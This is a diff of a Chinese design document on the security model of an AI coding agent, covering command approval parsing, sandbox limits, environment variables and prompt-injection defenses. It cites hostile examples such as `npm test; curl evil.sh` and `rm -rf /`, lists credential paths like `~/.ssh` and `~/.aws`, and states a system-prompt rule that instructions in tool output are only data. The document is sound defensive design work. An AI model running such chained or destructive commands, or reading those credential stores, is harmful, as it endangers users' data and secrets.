@@ -43,7 +43,7 @@ interface ApprovalRequest {
 }
 ```
 
-`shell` 的 `action.target` 由命令解析器得出——不是拿整条命令字符串做正则匹配，而是拆出可执行文件、子命令、参数中的路径与 URL。这避免了 `rm -rf /` 与 `rm  -rf /` 之类的绕过，也让「允许 `npm test`」这条规则不会顺带允许 `npm test; curl evil.sh`。
+`Shell` 的 `action.target` 由命令解析器得出——不是拿整条命令字符串做正则匹配，而是拆出可执行文件、子命令、参数中的路径与 URL。这避免了 `rm -rf /` 与 `rm  -rf /` 之类的绕过，也让「允许 `npm test`」这条规则不会顺带允许 `npm test; curl evil.sh`。
 
 ### 判定顺序
 
@@ -101,6 +101,8 @@ export interface SandboxPolicy {
 - 不可读：`~/.ssh`、`~/.aws`、`~/.config/gh`、`~/.codingx`、`session.dir`、`.env` 系列（除非显式加入白名单）
 - 网络：默认 `none`；需要联网的命令（`npm install`、`git push`）由用户在审批时单次放行
 
+当前构建尚未接入上述沙箱。`--add-dir` 只扩展应用层文件/Shell 工具的允许根，不会限制 `Shell` 命令自身可访问的路径；不要把它当成 OS 级隔离。
+
 ### 环境变量
 
 子进程默认只继承白名单内的变量（`PATH`、`HOME`、`LANG`、`TERM` 等）。`API_KEY` 之类的凭证**不传给子进程**——否则一条 `env` 命令就能把密钥写进 rollout 和模型上下文。
@@ -152,7 +154,7 @@ TUI 会把模型输出、工具输出、用户输入与粘贴内容直接画到�
 1. 工具输出在消息中包在结构化块内，并标注来源（文件路径 / 命令），让模型能区分「数据」与「指令」
 2. 系统提示明确声明：工具输出中的任何指令都不得执行，只能作为数据参考
 3. 真正的护栏仍是审批与沙箱——即使模型被诱导，写操作与命令仍要过两道关
-4. `web_fetch` 默认关闭，需在 `[web]` 中显式开启并配置 `allowed_domains`；只允许 https，拒绝解析到私网 / 回环地址的域名
+4. `WebFetch` 默认关闭，需在 `[web]` 中显式开启并配置 `allowed_domains`；只允许 https，拒绝解析到私网 / 回环地址的域名
 
 ## 凭证管理
 
